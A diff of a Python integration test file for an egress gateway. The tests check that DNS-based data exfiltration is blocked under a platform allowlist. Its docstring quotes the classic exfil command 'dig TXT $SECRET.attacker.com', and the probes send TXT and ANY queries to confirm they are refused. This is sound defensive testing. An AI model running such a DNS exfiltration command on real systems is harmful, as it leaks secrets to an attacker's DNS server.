@@ -1,15 +1,20 @@
 """P0#3 — DNS exfil channel closed (§6.3 of the EC design).
 
-Three invariants under test:
+Four invariants under test against the PLATFORM DNS policy (the DNS
+plane no longer consults tenant rules or source identity — see
+``rolemesh.egress.dns_policy``):
 
   1. Any qtype outside {A, AAAA, CNAME} returns REFUSED — the
      classic DNS exfil payload ``dig TXT $SECRET.attacker.com`` gets
-     nothing.
-  2. An A query for a domain NOT in the allowlist returns NXDOMAIN AND
-     never reaches the upstream resolver (no signal to the attacker's
-     authoritative DNS).
-  3. An A query for an allowlisted domain resolves to a real address
-     via upstream recursion (i.e. the allow path still works).
+     nothing, even for an allowlisted apex.
+  2. An A query for a domain NOT in EGRESS_DNS_ALLOWLIST returns
+     NXDOMAIN AND never reaches the upstream resolver (no signal to
+     the attacker's authoritative DNS).
+  3. The answer is identical for an UNREGISTERED probe — no lifecycle
+     event, no identity. Platform policy means the resolver needs no
+     idea who is asking, and fail-closed needs no registration.
+  4. An A query for an allowlisted domain (``dns.google``, set in
+     conftest's gateway Env) recurses upstream and resolves NOERROR.
 
 Because the probe container doesn't have ``dig`` preinstalled, we
 construct minimal DNS query packets with pure Python stdlib and parse
@@ -32,24 +37,8 @@ pytestmark = [
 ]
 
 
-TENANT_ID = "tenant-a"
-COWORKER_ID = "coworker-x"
-
-
-async def _seed_allowlist(topology: Topology, allow_host: str) -> None:
-    rule = {
-        "id": "rule-p0-3",
-        "rule_id": "rule-p0-3",
-        "tenant_id": TENANT_ID,
-        "coworker_id": None,
-        "stage": "egress_request",
-        "check_id": "egress.domain_rule",
-        "config": {"domain_patterns": [allow_host]},
-        "priority": 100,
-        "enabled": True,
-    }
-    await topology.seed_rules_responder([rule])
-    await topology.publish_rule_changed("created", rule)
+# Must match conftest's EGRESS_DNS_ALLOWLIST entry on the gateway Env.
+ALLOWLISTED_NAME = "dns.google"
 
 
 def _dns_probe_script(qname: str, qtype: str, gateway_ip: str) -> str:
@@ -99,22 +88,10 @@ async def test_txt_query_refused(
     """TXT qtype MUST return REFUSED even for names inside the
     allowlist — otherwise an attacker with a whitelisted apex can
     still exfiltrate data via TXT records."""
-    await _seed_allowlist(topology, topology.fake_upstream_name)
-
     probe = await topology.spawn_probe()
-    await topology.publish_lifecycle_started(
-        probe,
-        identity={
-            "tenant_id": TENANT_ID,
-            "coworker_id": COWORKER_ID,
-            "user_id": "u",
-            "conversation_id": "c",
-            "job_id": "job-p0-3-txt",
-        },
-    )
 
     rc, out = await probe.exec_sh(
-        f"python3 - <<'PY'\n{_dns_probe_script(topology.fake_upstream_name, 'TXT', topology.gateway_ip_on_agent_net)}\nPY"
+        f"python3 - <<'PY'\n{_dns_probe_script(ALLOWLISTED_NAME, 'TXT', topology.gateway_ip_on_agent_net)}\nPY"
     )
     assert rc == 0, out
     assert "RESULT=REFUSED" in out, out
@@ -125,19 +102,7 @@ async def test_any_query_refused(
 ) -> None:
     """ANY is the other classic exfil multiplexer — separate test so
     the failure mode is attributed correctly."""
-    await _seed_allowlist(topology, topology.fake_upstream_name)
-
     probe = await topology.spawn_probe()
-    await topology.publish_lifecycle_started(
-        probe,
-        identity={
-            "tenant_id": TENANT_ID,
-            "coworker_id": COWORKER_ID,
-            "user_id": "u",
-            "conversation_id": "c",
-            "job_id": "job-p0-3-any",
-        },
-    )
 
     rc, out = await probe.exec_sh(
         f"python3 - <<'PY'\n{_dns_probe_script('example.com', 'ANY', topology.gateway_ip_on_agent_net)}\nPY"
@@ -151,23 +116,30 @@ async def test_a_query_blocked_domain_is_nxdomain(
 ) -> None:
     """A query for a non-allowlisted name gets NXDOMAIN — and crucially
     the upstream resolver never sees the query, so the attacker's
-    authoritative DNS records no hit."""
-    await _seed_allowlist(topology, topology.fake_upstream_name)
+    authoritative DNS records no hit.
 
+    Deliberately NO lifecycle event for this probe: the platform
+    policy must answer identically for an agent the gateway has never
+    heard of (fail-closed without registration)."""
     probe = await topology.spawn_probe()
-    await topology.publish_lifecycle_started(
-        probe,
-        identity={
-            "tenant_id": TENANT_ID,
-            "coworker_id": COWORKER_ID,
-            "user_id": "u",
-            "conversation_id": "c",
-            "job_id": "job-p0-3-block",
-        },
-    )
 
     rc, out = await probe.exec_sh(
         f"python3 - <<'PY'\n{_dns_probe_script('evil-unknown-host-p0-3.test', 'A', topology.gateway_ip_on_agent_net)}\nPY"
     )
     assert rc == 0, out
     assert "RESULT=NXDOMAIN" in out, out
+
+
+async def test_a_query_allowlisted_domain_resolves(
+    topology: Topology, per_test_cleanup: None
+) -> None:
+    """Allow path: a name on the platform allowlist recurses to the
+    real upstream resolvers and comes back NOERROR. Needs outbound
+    internet from the Docker host (same requirement as image pulls)."""
+    probe = await topology.spawn_probe()
+
+    rc, out = await probe.exec_sh(
+        f"python3 - <<'PY'\n{_dns_probe_script(ALLOWLISTED_NAME, 'A', topology.gateway_ip_on_agent_net)}\nPY"
+    )
+    assert rc == 0, out
+    assert "RESULT=NOERROR" in out, out
